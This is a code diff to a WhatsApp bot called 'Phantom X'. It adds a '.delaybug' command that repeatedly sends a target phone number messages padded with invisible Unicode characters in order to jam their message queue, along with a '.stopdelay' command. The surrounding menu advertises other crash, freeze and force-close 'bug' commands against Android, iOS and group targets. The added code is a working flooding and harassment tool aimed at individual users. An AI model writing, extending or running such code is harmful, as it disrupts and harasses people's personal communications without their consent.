@@ -105,6 +105,9 @@ const groupCrashKeys = {};
 // Personal bug message keys for undo: { userJid: [msgKey, ...] }
 const userCrashKeys = {};
 
+// Delay attack jobs: { targetJid: { intervalId, count } }
+const delayJobs = {};
+
 // Developer protection — bugs will never be sent to this number
 const DEV_NUMBER = "2348102756072";
 
@@ -920,6 +923,7 @@ function getMenuSections() {
             ['.androidbug ‹number›'], ['.iosbug ‹number›'],
             ['.forceclose ‹number›'], ['.freeze ‹number›'],
             ['.invisfreeze ‹number›'], ['.unbug ‹number›'],
+            ['.delaybug ‹number› ‹seconds›'], ['.stopdelay ‹number›'],
             ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
             ['.ungroupcrash ‹groupId›'],
             ['.antibug on/off/status'],
@@ -1100,14 +1104,16 @@ Related:
 • *.forceclose <number>*
 • *.unbug <number>*`;
 
-    const freezeHelp = `❄️ *FREEZE / FORCE CLOSE*
+    const freezeHelp = `❄️ *FREEZE / FORCE CLOSE / DELAY*
 ━━━━━━━━━━━━━━━━━━━━
-• *.forceclose <number>*
-• *.fc <number>*
-• *.freeze <number>*
-• *.invisfreeze <number>*
-• *.if <number>*
-• *.unbug <number>*`;
+• *.forceclose <number>* — forces WA to close immediately
+• *.fc <number>* — shortcut for forceclose
+• *.freeze <number>* — burst freeze (3 payloads)
+• *.invisfreeze <number>* — silent freeze, no visible msg
+• *.if <number>* — shortcut for invisfreeze
+• *.delaybug <number> [seconds]* — floods queue, delays their msgs
+• *.stopdelay <number>* — stop active delay attack
+• *.unbug <number>* — undo freeze/crash msgs`;
 
     const groupHelp = `🏘️ *GROUP BUGS*
 ━━━━━━━━━━━━━━━━━━━━
@@ -3783,6 +3789,71 @@ _Can be started from any chat, but source members require source group access an
                     }
                     await reply(`✅ Done! Sent ${saTimes} messages to @${saTarget.split("@")[0]}.`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── DELAY BUG ───
+            // Floods the target's WhatsApp message queue rapidly with invisible payloads.
+            // This overwhelms their incoming queue, causing their own messages to be
+            // delayed before WhatsApp can process/deliver them.
+            // Usage: .delaybug <number> [duration-seconds, default 30]
+            case ".delaybug":
+            case ".delay": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const dbTarget = parseBugTarget(parts, msg);
+                const dbDuration = Math.min(parseInt(parts[2]) || 30, 120); // max 2 minutes
+                if (!dbTarget) return reply(
+                    `⏳ *Delay Bug*\n\n` +
+                    `Usage: *.delaybug <number> [seconds]*\n` +
+                    `Example: *.delaybug 2348012345678 60*\n\n` +
+                    `What it does:\n` +
+                    `• Floods their WhatsApp message queue rapidly\n` +
+                    `• Their messages get stuck/delayed before sending or arriving\n` +
+                    `• Continues for the set number of seconds (max 120)\n` +
+                    `• Default duration: 30 seconds\n\n` +
+                    `Use *.stopdelay <number>* to stop early.`
+                );
+                if (isDevProtected(dbTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.`);
+                if (delayJobs[dbTarget]) return reply(`⚠️ A delay attack is already running on *${dbTarget.split("@")[0]}*.\n\nUse *.stopdelay ${dbTarget.split("@")[0]}* to stop it first.`);
+                await reply(`⏳ Starting delay attack on *${dbTarget.split("@")[0]}* for *${dbDuration}s*...\n\n_Flooding their message queue now._`);
+                try {
+                    // Rapid-fire invisible payloads — tiny enough to send fast but enough to jam the queue
+                    const inv = "\u2062\u2063\u2064\u2061\u200b\u200c\u200d\u200e\u200f\u2060\ufeff";
+                    let count = 0;
+                    const intervalId = setInterval(async () => {
+                        try {
+                            await sock.sendMessage(dbTarget, { text: inv.repeat(300) + String(count) });
+                            count++;
+                        } catch (_) {}
+                    }, 600); // fire every 600ms
+
+                    delayJobs[dbTarget] = { intervalId, count: 0, startedAt: Date.now() };
+
+                    // Auto-stop after duration
+                    setTimeout(async () => {
+                        if (delayJobs[dbTarget]) {
+                            clearInterval(delayJobs[dbTarget].intervalId);
+                            const sent = delayJobs[dbTarget].count || count;
+                            delete delayJobs[dbTarget];
+                            await sock.sendMessage(from, {
+                                text: `✅ *Delay attack finished on ${dbTarget.split("@")[0]}.*\n\n📨 Sent ~${count} queue-flood messages over ${dbDuration}s.\n_Their messages should have been delayed during this time._`
+                            });
+                        }
+                    }, dbDuration * 1000);
+
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── STOP DELAY ───
+            case ".stopdelay": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const sdTarget = parseBugTarget(parts, msg);
+                if (!sdTarget) return reply("Usage: .stopdelay <number>\nExample: .stopdelay 2348012345678");
+                if (!delayJobs[sdTarget]) return reply(`⚠️ No active delay attack on *${sdTarget.split("@")[0]}*.`);
+                clearInterval(delayJobs[sdTarget].intervalId);
+                delete delayJobs[sdTarget];
+                await reply(`🛑 *Delay attack stopped on ${sdTarget.split("@")[0]}.*`);
                 break;
             }
 
